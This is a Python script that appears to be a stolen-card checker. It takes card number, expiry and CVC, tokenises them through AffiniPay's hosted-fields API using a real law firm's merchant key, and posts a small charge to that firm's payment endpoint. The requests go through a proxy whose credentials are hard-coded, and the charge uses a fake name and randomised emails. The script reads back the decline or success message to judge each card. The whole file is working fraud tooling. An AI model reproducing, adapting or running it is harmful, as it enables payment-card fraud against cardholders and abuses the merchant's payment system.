import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if "01" in mm or "02" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
		mm = mm.split("0")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'www.defendingtexas.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'referer': 'https://www.google.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'cross-site',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	response = requests.get('https://www.defendingtexas.com/payment-options/', headers=headers)
	
	nonce = re.search(r'"receiptPage":"","nonce":"(.*?)"', response.text).group(1)
	
	headers = {
	    'authority': 'api.affinipay.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/vnd.api+json',
	    'origin': 'https://cdn.affinipay.com',
	    'referer': 'https://cdn.affinipay.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = '{"data":{"type":"legacy_field_token","attributes":{"content":"'+str(n)+'","merchant_public_key":"m_Ps7bKEzCQC-poNN105oEqQ"}}}'
	
	response = session.post('https://api.affinipay.com/hostedfields/fields', headers=headers, data=data)
	
	cc = re.search(r'"id":"(.*?)"', response.text).group(1)
	
	headers = {
	    'authority': 'api.affinipay.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/vnd.api+json',
	    'origin': 'https://cdn.affinipay.com',
	    'referer': 'https://cdn.affinipay.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = '{"data":{"type":"legacy_field_token","attributes":{"content":"'+str(cvc)+'","merchant_public_key":"m_Ps7bKEzCQC-poNN105oEqQ"}}}'
	
	response = session.post('https://api.affinipay.com/hostedfields/fields', headers=headers, data=data)
	
	cvv = re.search(r'"id":"(.*?)"', response.text).group(1)
	
	headers = {
	    'authority': 'api.affinipay.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/vnd.api+json',
	    'origin': 'https://www.defendingtexas.com',
	    'referer': 'https://www.defendingtexas.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = '{"data":{"type":"legacy_credit_card_token","attributes":{"merchant_public_key":"m_Ps7bKEzCQC-poNN105oEqQ","address1":"Street 27","postal_code":"10080","email":"rodamuser08@gmail.com","name":"Rodam User","expiration_date":{"month":'+str(mm)+',"year":20'+str(yy)+'}},"relationships":{"credit_card_number_token":{"data":{"type":"legacy_field_token","id":"'+str(cc)+'"}},"cvv_token":{"data":{"type":"legacy_field_token","id":"'+str(cvv)+'"}}}}}'
	
	response = session.post('https://api.affinipay.com/hostedfields/methods', headers=headers, data=data)
	
	id = re.search(r'"legacy_id":"(.*?)"', response.text).group(1)
	last4 = re.search(r'"masked_credit_card_number":"(.*?)"', response.text).group(1)
	
	headers = {
	    'authority': 'www.defendingtexas.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/json',
	    'origin': 'https://www.defendingtexas.com',
	    'referer': 'https://www.defendingtexas.com/payment-options/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-wp-nonce': nonce,
	}
	
	json_data = {
	    'postal_code': '10080',
	    'address1': 'Street 27',
	    'email': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
	    'type': 'card',
	    'cvv': '****',
	    'number': last4,
	    'exp_month': mm,
	    'exp_year': f'20{yy}',
	    'name': 'Rodam User',
	    'form_data': {
	        'account_id': 'Z9pGF4i-Q8mkNRqUqGhVGA',
	        'amount': '100',
	        'exp_month': mm,
	        'exp_year': f'20{yy}',
	        'name': 'Rodam User',
	        'email': 'rodamuser08@gmail.com',
	        'address1': 'Street 27',
	        'postal_code': '10080',
	    },
	    'id': id,
	}
	
	response = session.post(
	    'https://www.defendingtexas.com/?rest_route=/affinipay/v1/charge',
	    headers=headers,
	    json=json_data,
	)
	
	try:
		result = re.search(r'"level":"error","message":"(.*?)"', response.text).group(1)
	except:
		result = re.search(r'"type":"(.*?)"', response.text).group(1)
		
	return (result)